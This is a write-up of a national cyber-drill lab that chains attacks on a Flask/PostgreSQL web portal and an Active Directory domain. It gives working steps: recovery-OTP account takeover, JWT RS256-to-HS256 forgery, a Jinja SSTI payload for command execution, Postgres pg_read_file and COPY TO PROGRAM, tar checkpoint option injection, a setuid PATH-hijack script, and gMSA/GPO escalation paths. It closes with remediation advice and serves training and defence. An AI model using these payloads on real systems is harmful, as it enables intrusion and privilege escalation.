# DGSSI CYBERDRILL 2026 WRITEUP

---

## 1. Summary

The Mouwatin platform was compromised end-to-end from an unauthenticated internet-facing
position to full root on the Linux application host, followed by a pivot into Active Directory.

The chain required chaining multiple distinct weaknesses:

1. **Sensitive-data exposure :** the public registry API injects the milestone flag into
every one of the 500 citizen records (`app.py` reads `FLAG1_PATH`).
2. **Broken recovery flow** **:** the SMS OTP is returned in the HTTP response body, enabling
account takeover of any citizen.
3. **JWT RS256 → HS256 algorithm confusion** **:** tokens are HMAC-signed with the *public* key
PEM, so an attacker who knows the public key can forge tokens.
4. **Client-controlled authorization** **:** the `role` claim is trusted from the JWT.
5. **Server-Side Template Injection (SSTI)** **:** a complaint description is concatenated into
`render_template_string()`, giving RCE in the web container.
6. **PostgreSQL `pg_read_file` / `COPY … TO PROGRAM`** **:** the app DB role is a superuser,
giving arbitrary file read and command execution in the DB container.
7. **GNU tar wildcard option-injection** → **setuid PATH hijack** **:** a host archive job runs
`tar … *` in a world-writable directory, and a setuid-root helper calls
`system("review-status")` with a relative path, yielding root.
8. **Windows Service DACL Misconfiguration** → **SYSTEM Escalation** **:** The n.elouafi account has SERVICE_CHANGE_CONFIG permissions on the MouwatinTelemetry service running as LocalSystem, providing a privilege escalation path on MOUW-WS01.
9. **gMSA Delegation Abuse** → **GPO-Based Domain Escalation** **:** The MOUW-WS01$ computer account can retrieve the svc-policy$ gMSA password. Combined with svc-policy$ having GenericAll over the Controller Response Package GPO and n.elouafi having WriteGPLink on the Domain Controllers OU.

---

## 2. Scope & Environment

| Role | Host | Notes |
| --- | --- | --- |
| Kali | `13.51.237.143` (`itsutsu`) |  |
| Web / app host | `176.16.17.5` (`web1.ad.mouwatin.internal`, “vanadzor”) | ports 22, 80, 8080 |
| Workstation | `176.16.17.6` (`MOUW-WS01`, “gyumri”) | WinRM 5985, AD-joined |
| Domain controller | `176.16.17.4` (`MOUW-DC01`, “yerevan”) | AD `ad.mouwatin.internal` |

The web application is a Flask app (Gunicorn) backed by PostgreSQL 17.6, deployed with
Docker. The web and DB containers share a bind-mount of the host directory
`/srv/mouwatin/incoming` (mode 777).

---

## 3. Reconnaissance

```bash
# From the Kali box
nmap -Pn -sV -p- 176.16.17.5 -T4 -oN nmap_web.txt
# 22/tcp   ssh
# 80/tcp   http   -> redirects to the portal
# 8080/tcp http   -> Flask/Gunicorn

curl -s http://176.16.17.5/api/auth/metadata
# {"algorithms":["RS256","HS256"], ...}   <-- algorithm confusion is enabled

curl -s http://176.16.17.5/.well-known/jwks.json
# kid: mouwatin-access-01
curl -s http://176.16.17.5/api/auth/keys/access.pub   # RSA-2048 public key
```

Enumeration of the frontend JS (`app.js`) exposed the API surface:

- `/api/v1/registry?scope=all`
- `/api/auth/login`, `/api/auth/recovery/{request,confirm}`
- `/api/auth/device/legacy-activate`
- `/api/complaints` (citizen) and `/api/staff/complaints/<id>/export` (staff)

---

## 4. Attack Chain (stage by stage)

### Stage 0 - Flag 1 : public registry data exposure

```
GET /api/v1/registry?scope=all
```

Every one of the 500 citizen records contains a `flag` field. The application reads the
milestone flag file (`FLAG1_PATH=/run/flags/local1.txt`) and injects its contents into each
registry record. No authentication is required.

### Stage 1 - Citizen account takeover (broken recovery)

```
POST /api/auth/recovery/request  {"cin":"<from registry>","phone":"<from registry>"}
  -> {"challenge_id":"...","delivery":{"code":"<OTP>"}}   # OTP returned to the caller!
  
POST /api/auth/recovery/confirm  {"challenge_id":"...","otp":"<delivery.code>","new_password":"..."}

POST /api/auth/login             {"cin":"...","password":"..."}    -> {"pending_id":"..."}

POST /api/auth/device/legacy-activate {"pending_id":"...","device_id":"TERM-001"} -> {"access_token":"<JWT>"}
```

Because the recovery API echoes the SMS OTP in its own response, any citizen account can be
reset without owning the phone.

### Stage 2 - JWT RS256 → HS256 algorithm confusion + role escalation

`app.py` (lines ~107–113) accepts `HS256` and computes the HMAC using the **public key PEM
bytes** as the secret. Since `access.pub` is public, an attacker can forge tokens. The
`role` claim is trusted directly (`require("staff")`), so re-signing the legitimate session
token with `"role":"staff"` grants staff access.

```python
hdr = {"typ":"JWT","alg":"HS256","kid":"mouwatin-access-01"}
sig = HMAC-SHA256(key=access.pub_bytes, msg=header_b64 + "." + payload_b64)
```

`GET /api/me` then returns `role: staff`.

### Stage 3 - SSTI → RCE in the web container (Flag 2)

`app.py` line ~404:

```python
return render_template_string(frame + item["description"] + "</div>...</html>")
```

A complaint description is concatenated into the template **source**. Submit a complaint
with a Jinja payload and then request the staff export:

```
POST /api/complaints  {"category":"Autre","subject":"src","description":"{{7*7}}"}   # -> renders 49
# then:
GET /api/staff/complaints/<reference>/export
```

RCE payload used:

```
{{config.__class__.__init__.__globals__['os'].popen('cat /run/flags/*.txt').read()}}
```

Command execution confirmed as user `portal` (uid 10001), working dir `/srv/app`,
hostname `77c8f0ca9753`. The web container mounts `/run/flags/local1.txt` and
`/run/flags/local2.txt`.

### Stage 4 - Pivot to the database container (Flag 3)

The web container’s environment disclosed the DB credentials:

```
DB_HOST=db  DB_NAME=mouwatin  DB_USER=mouwatin_admin
POSTGRES_PASSWORD=68af3b77eeffa57cffc9aa557ef2d8c75a5c76a3dcd165e0
```

`db` resolves to `172.18.0.2` on the Docker network, and `mouwatin_admin` is a **superuser**
(`rolsuper=True`). From the web-container RCE:

```sql
PGPASSWORD='68af3b77eeffa57cffc9aa557ef2d8c75a5c76a3dcd165e0' \
psql -h db -U mouwatin_admin -d mouwatin -c "SELECT pg_read_file('/run/flags/local3.txt',0,200);"
```

The DB container mounts only `local3.txt` (the web container mounts `local1/2`), confirming
it is the DB container’s own flag. The same superuser can also achieve command execution via
`COPY (SELECT 1) TO PROGRAM '<shell command>'`. This last is a separate Postgres superuser feature that pipes query output into an arbitrary OS command, i.e. full **command execution**, not just file read.

### Stage 5 - Container → host (svc-archive) via tar wildcard injection (Flag 4)

The DB container bind-mounts the host directory `/srv/mouwatin/incoming` at
`/var/lib/postgresql/incoming` (mode **777**). A host systemd timer
(`mouwatin-archive.timer`, ~2-minute cycle) runs, as `svc-archive` (uid 997):

```bash
tar czf intake-<ts>.tgz *
```

The final argument introduces a critical security weakness.

The `*` wildcard is expanded by the shell before GNU tar processes the command.

For example, if the directory contains:

```
document.txt
report.csv
backup.log
```

The shell expands the command into something equivalent to:

```bash
tar czf intake-<ts>.tgz document.txt report.csv backup.log
```

The problem arises when filenames begin with characters that GNU tar interprets as command-line options.

For example:

```
--checkpoint=1
--checkpoint-action=exec=sh x
```

Rather than treating these values as ordinary filenames, GNU tar can interpret them as additional options.

A wildcard in a writable directory is a classic GNU tar option-injection sink. Using the
Postgres RCE (running as `postgres`, which can write into the shared dir), we dropped:

- `-checkpoint=1` (empty file → becomes a tar option)
- `-checkpoint-action=exec=sh x` (empty file → becomes a tar option)
- `x` (a shell script containing our commands)

When the timer fired, tar parsed the two `--…` filenames as options and executed
`sh x` **as svc-archive (uid 997)** on the host. Host enumeration (via `x`) revealed:

- `/usr/local/bin/archive-review` - a **setuid-root** ELF that runs
`setgid(0); setuid(0); system("review-status")`.
- `/home/local1.txt … /home/local4.txt` (uid 55555, mode 644).
- Docker socket is `root:docker 660`; svc-archive is **not** in the `docker` group (ruled out).

### Stage 6 - svc-archive → root via setuid PATH hijack (Flag 5)

`/usr/local/bin/archive-review` is setuid-root (`-rwsr-xr-x root root`, 16048 bytes) and does `setgid(0); setuid(0); system("review-status")` - a **bare, relative** name. `system()` resolves it through the caller's `PATH`.

**The exploit:** we plant a fake `review-status` and put its dir first in PATH, then run the setuid binary:

```bash
#!/bin/sh
export PATH="/srv/mouwatin/incoming:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
cat > /srv/mouwatin/incoming/review-status <<'EOS'
#!/bin/sh
{ id; cat /root/proof.txt; } > /srv/mouwatin/incoming/ROOT.txt 2>&1
chmod 644 /srv/mouwatin/incoming/ROOT.txt
EOS
chmod 755 /srv/mouwatin/incoming/review-status
/usr/local/bin/archive-review
```

Confirmed root context: `uid=0(root) gid=0(root) groups=0(root),986(svc-archive)`.

**The one detail that unblocked it:** the injected script runs on the **host**, so PATH must point at `/srv/mouwatin/incoming` not the container view `/var/lib/postgresql/incoming`. With the container path the real `/usr/local/bin/review-status` won and the hijack silently failed.

---
### Stage 7 - Pivoting to Windows and Active Directory

After obtaining root privileges on `web1.ad.mouwatin.internal`, we shifted our attention toward the Windows infrastructure.

Our previous enumeration had identified two additional machines belonging to the `ad.mouwatin.internal` domain:

| Host | IP Address | Role |
| --- | --- | --- |
| `MOUW-WS01` | `176.16.17.6` | Domain-joined Windows workstation |
| `MOUW-DC01` | `176.16.17.4` | Active Directory Domain Controller |

#### **7.1 Discovering Active Directory Artifacts**

Our objective was to determine whether the compromised Linux host contained credentials or artifacts that could provide an entry point into the Active Directory environment.

With root access, we searched the Linux filesystem for potentially useful files, particularly backups and password-cracking results.

```
find / -name "*.bak" -o -name "*.pot" 2>/dev/null
```

The enumeration revealed two interesting artifacts:

```
/home/ubuntu/dacledit-*.bak
~/.john/john.pot
```

These files were particularly relevant to our next objective.

**1. DACL modification backups**

The `dacledit-*.bak` files suggested that Active Directory access control lists had previously been modified or backed up using Impacket's `dacledit` utility.

In Active Directory, a Discretionary Access Control List (DACL) determines which users or groups can perform operations against an object.

These operations can include modifying permissions, changing object attributes, or controlling access to sensitive resources.

The existence of these backups was therefore a useful indication that Active Directory ACL manipulation could be relevant to the lab.

However, the backup filenames alone did not establish which permissions had been modified.

**2. John the Ripper credential artifacts**

The second interesting artifact was:

```
~/.john/john.pot
```

John the Ripper stores successfully cracked password results in a `.pot` file.

Our recovered credential material included:

```
ad.mouwatin.internal\n.elouafi:OpPwn2026!
```

This provided a potential authentication path into the Windows domain.

At this stage, we had obtained credentials for the domain account `n.elouafi`, but we still needed to determine where they were valid and what privileges the account possessed.

#### **7.2 Validating Windows Access with NetExec**

We proceeded to validate the recovered credentials against the Windows hosts using NetExec.

We started by testing WinRM authentication against the workstation.

```
nxc winrm 176.16.17.6 -u n.elouafi -p 'OpPwn2026!'
```

The response was:

```
[*] Windows Server 2022 Build 20348 (name:MOUW-WS01)
[+] ad.mouwatin.internal\n.elouafi:OpPwn2026! (Pwn3d!)
```

The `Pwn3d!` indicator confirmed that the account possessed administrative-level access through WinRM on `MOUW-WS01`.

This was an important finding because it established a working foothold in the Windows environment.

We then tested the same credentials against the Domain Controller.

```
nxc winrm 176.16.17.4 -u n.elouafi -p 'OpPwn2026!'
```

However, the authentication attempt did not provide access:

```
[-] ad.mouwatin.internal\n.elouafi:OpPwn2026!
```

This established an important distinction:

- We had administrative WinRM access to `MOUW-WS01`.
- We did not have equivalent WinRM access to `MOUW-DC01`.

The recovered credentials were therefore useful for accessing the workstation, but did not directly grant control over the Domain Controller.

We needed to investigate whether the workstation and its associated domain permissions exposed another route toward higher privileges.

### 7.3 Enumerating Windows Services

After identifying administrative access to the workstation, we examined its installed services.

Windows services are particularly interesting during privilege escalation because some execute under highly privileged security contexts, including `NT AUTHORITY\SYSTEM`.

If a lower-privileged user can modify the configuration of such a service, the service may become a privilege escalation vector.

Two services were relevant to our investigation.

**MouwatinTelemetry**

We inspected the service configuration:

```
sc qc MouwatinTelemetry
```

The relevant output was:

```
TYPE               : WIN32_OWN_PROCESS
START_TYPE         : AUTO_START
BINARY_PATH_NAME   : "C:\Program Files\Mouwatin\Services\mouwatin-service.exe"
SERVICE_START_NAME : LocalSystem
```

The service was configured to start automatically and execute under the `LocalSystem` account.

`LocalSystem`, also represented as `NT AUTHORITY\SYSTEM`, is one of the most privileged local security contexts on Windows.

It has extensive control over the local operating system and can authenticate to network resources using the computer account when applicable.

Consequently, the permissions controlling this service were worth investigating.

**MouwatinPolicy**

We also inspected the policy-related service:

```
sc qc MouwatinPolicy
```

The relevant configuration was:

```
SERVICE_START_NAME : MOUWATIN\svc-policy$
BINARY_PATH_NAME   : C:\ProgramData\Mouwatin\Policy\policy-service.exe
```

Unlike the telemetry service, this service ran under a domain-managed service account:

```
svc-policy$
```

The trailing `$` and the account's configuration indicated that it was a Group Managed Service Account (gMSA).

This was particularly interesting because gMSAs are domain identities designed for services that require automatic password management.

#### 7.4 Identifying a Service DACL Misconfiguration

To investigate whether `n.elouafi` had any control over the telemetry service, we examined its security descriptor.

```
sc sdshow MouwatinTelemetry
```

The relevant DACL entry was:

```
D:(A;;CCDCLCRPWPRC;;S-1-5-21-...-1198)
```

The SID ending in `1198` corresponded to:

```
ad.mouwatin.internal\n.elouafi
```

Windows service permissions are represented through security descriptors containing Access Control Entries (ACEs).

Each ACE specifies which security principal receives particular permissions.

The discovered entry was significant because it granted the account service-related permissions, including the ability to modify the service configuration.

The important rights were:

| Permission | Significance |
| --- | --- |
| `SERVICE_CHANGE_CONFIG` | Allows changes to service configuration, including executable settings |
| `SERVICE_START` | Allows a service to be started |

Because `MouwatinTelemetry` ran as `LocalSystem`, control over its executable configuration represented a potential local privilege escalation primitive.

In principle, an account able to modify a privileged service's executable configuration and trigger its execution may be able to cause code to run under the service's security context.

This provided a possible route from the recovered domain identity to `NT AUTHORITY\SYSTEM` on the workstation.

**Important:** The service permissions were identified, but the supplied evidence does not document the actual service reconfiguration or a successful SYSTEM execution.

We therefore treated this as an identified escalation opportunity rather than a completed exploitation step.

#### 7.5 Understanding the Group Managed Service Account

The next part of our investigation focused on the `svc-policy$` account.

A Group Managed Service Account, or gMSA, is a special type of Active Directory account designed to run services without requiring administrators to manage passwords manually.

Unlike traditional service accounts, gMSA passwords are generated and rotated automatically by Active Directory.

However, not every domain computer or user is permitted to retrieve these passwords.

Active Directory controls this access through an attribute called:

```
msDS-GroupMSAMembership
```

This attribute contains a security descriptor that determines which security principals are authorized to retrieve the managed password.

We queried the account using LDAP:

```
ldapsearch -x -H ldap://176.16.17.4 \
  -D "n.elouafi@ad.mouwatin.internal" \
  -w "OpPwn2026!" \
  -b "DC=ad,DC=mouwatin,DC=internal" \
  "(sAMAccountName=svc-policy\$)" \
  msDS-GroupMSAMembership
```

The relevant result identified:

```
CN=MOUW-WS01$,OU=Workstations,...
```

This indicated that the workstation's computer account was authorized to retrieve the managed password for `svc-policy$`.

#### 7.6 Enumerating Group Policy Permissions

Our investigation then focused on Active Directory Group Policy Objects (GPOs).

Group Policy is a Windows domain management mechanism that allows administrators to centrally configure computers and users.

GPOs can control security settings, software configuration, scripts, scheduled tasks, and other operating system behavior.

They become particularly sensitive when applied to Domain Controllers.

Through BloodHound analysis and ACL enumeration using `dacledit`, we identified two important permission relationships.

**Finding 1 - Control over a GPO**

The account:

```
svc-policy$
```

had the following permission on a GPO named `Controller Response Package`:

```
GenericAll
```

`GenericAll` represents broad control over an Active Directory object.

For a GPO, this level of control can allow an authorized principal to modify policy-related settings, subject to the associated Group Policy files and filesystem permissions.

This was a potentially significant finding because a maliciously modified GPO could influence systems that process it.

**Finding 2 - GPO linking permissions**

The account:

```
n.elouafi
```

possessed:

```
WriteGPLink
```

on the:

```
Domain Controllers OU
```

The `gPLink` attribute controls which GPOs are linked to an Active Directory container.

A principal able to modify this attribute may be able to change which policies are associated with that container.

Because the target container was the Domain Controllers OU, the permission was especially sensitive.

These two findings suggested a potential combination of privileges:

| Principal | Permission | Target |
| --- | --- | --- |
| `svc-policy$` | `GenericAll` | `Controller Response Package` GPO |
| `n.elouafi` | `WriteGPLink` | Domain Controllers OU |

Individually, these permissions were already worth investigating.

Together, they suggested that one identity might be able to modify a GPO while another could control its association with the Domain Controllers OU.

However, successfully affecting Domain Controllers would also depend on policy processing, security filtering, GPO file permissions, and other environmental controls.

---

## Remediation Recommendations

The following measures are recommended to address the vulnerabilities identified throughout the attack chain and prevent similar compromises.

### 1. Sensitive Data Exposure - Public Registry API

- Enforce server-side authentication and authorization on sensitive API endpoints, including `/api/v1/registry`.
- Apply data minimization by returning only fields explicitly required by the requesting user.
- Remove sensitive information, internal flags, and secrets from publicly accessible API responses.

### 2. Broken Account Recovery Flow

- Never expose OTPs or recovery codes in HTTP responses.
- Deliver recovery codes exclusively through verified out-of-band channels, such as registered phone numbers or email addresses.
- Implement OTP expiration, single-use validation, rate limiting, and account recovery abuse detection.

### 3. JWT Algorithm Confusion (RS256 → HS256)

- Enforce a strict server-side allowlist of JWT signing algorithms, preferably `RS256` for the existing architecture.
- Never allow RSA public keys to be reused as HMAC secrets.
- Validate JWT signatures, issuers, audiences, expiration times, and key identifiers using trusted server-side configuration.

### 4. Client-Controlled Authorization

- Enforce role-based access control (RBAC) on every protected API endpoint.
- Validate user roles and permissions against trusted server-side authorization data rather than relying solely on client-supplied claims.
- Apply the principle of least privilege and prevent unauthorized access to staff-only functionality.

### 5. Server-Side Template Injection (SSTI)

- Never concatenate user-controlled input directly into `render_template_string()` or other template source code.
- Pass user input as template variables and rely on proper contextual escaping.
- Restrict application container privileges, filesystem access, and access to sensitive environment variables to reduce the impact of code execution.

### 6. PostgreSQL Privilege Abuse

- Remove `SUPERUSER` privileges from the application database account `mouwatin_admin`.
- Restrict access to dangerous database capabilities, including `pg_read_file()` and `COPY ... TO PROGRAM`.
- Use dedicated, least-privileged database roles and securely manage database credentials.
- Isolate database containers and restrict unnecessary filesystem mounts.

### 7. GNU Tar Wildcard Injection and SUID PATH Hijacking

- Avoid using untrusted wildcard expansions () in privileged archive operations; use safe file selection and explicit path handling.
- Restrict write permissions on directories processed by scheduled tasks or privileged services.
- Remove unnecessary SUID permissions from `/usr/local/bin/archive-review`.
- Replace relative command execution such as `system("review-status")` with absolute executable paths and a controlled execution environment.
- Run scheduled archive services with the minimum privileges required.

### 8. Windows Service DACL Misconfiguration

- Remove unnecessary `SERVICE_CHANGE_CONFIG` and service-control permissions from unprivileged accounts on `MouwatinTelemetry`.
- Restrict service configuration changes to explicitly authorized administrators.
- Audit Windows service security descriptors and monitor unauthorized service modifications.
- Avoid running custom services as `LocalSystem` unless strictly necessary; use dedicated least-privileged service identities.

### 9. gMSA Delegation Abuse and GPO-Based Domain Escalation

- Restrict gMSA password retrieval permissions to explicitly authorized computer accounts and security principals.
- Regularly audit `msDS-GroupMSAMembership` and remove unnecessary delegations.
- Remove excessive `GenericAll` permissions granted to `svc-policy$` on the **Controller Response Package** GPO.
- Restrict `WriteGPLink` permissions on the **Domain Controllers OU** to trusted Domain Administrators or designated Group Policy administrators.
- Secure both GPO modification permissions and associated SYSVOL filesystem permissions.
- Monitor sensitive GPO modifications, OU link changes, and unauthorized policy deployments affecting Domain Controllers.
